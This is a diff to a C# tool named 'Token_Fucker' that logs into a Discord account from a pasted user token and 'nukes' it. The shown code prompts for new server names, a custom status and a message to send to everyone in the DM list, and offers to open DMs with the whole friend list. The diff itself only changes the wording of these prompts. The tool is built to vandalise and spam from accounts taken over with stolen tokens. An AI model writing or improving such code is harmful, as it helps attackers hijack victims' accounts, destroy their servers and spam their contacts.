@@ -15,7 +15,7 @@ namespace Token_Fucker
     {
         static void Main(string[] args)
         {
-            Console.WriteLine("Enter a token to be fucked.");
+            Console.Write("Enter a token to be fucked: ");
             string token = Console.ReadLine();
             DiscordSocketClient client = new DiscordSocketClient(new DiscordSocketConfig() { ApiVersion = 7 });
             client.OnLoggedIn += Client_OnLoggedIn;
@@ -31,13 +31,13 @@ namespace Token_Fucker
         private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
         {
             Console.WriteLine("Started client, nuking.");
-            Console.WriteLine("What do you want the servers to be named to?");
+            Console.Write("What do you want the servers to be named to? > ");
             string guildname = Console.ReadLine();
-            Console.WriteLine("What do you want to set the custom status to?");
+            Console.Write("What do you want to set the custom status to? > ");
             string status = Console.ReadLine();
-            Console.WriteLine("What do you want to send to everyone in the DM list.");
+            Console.Write("What do you want to send to everyone in the DM list. > ");
             string dmmessage = Console.ReadLine();
-            Console.WriteLine("Do you want to open dms with entire friend list? y/n [This can get the acc phone locked/disabled]");
+            Console.Write("Do you want to open dms with entire friend list? y/n [This can get the acc phone locked/disabled] > ");
             string opendms = Console.ReadLine();
 
             var guilds = client.GetGuilds();
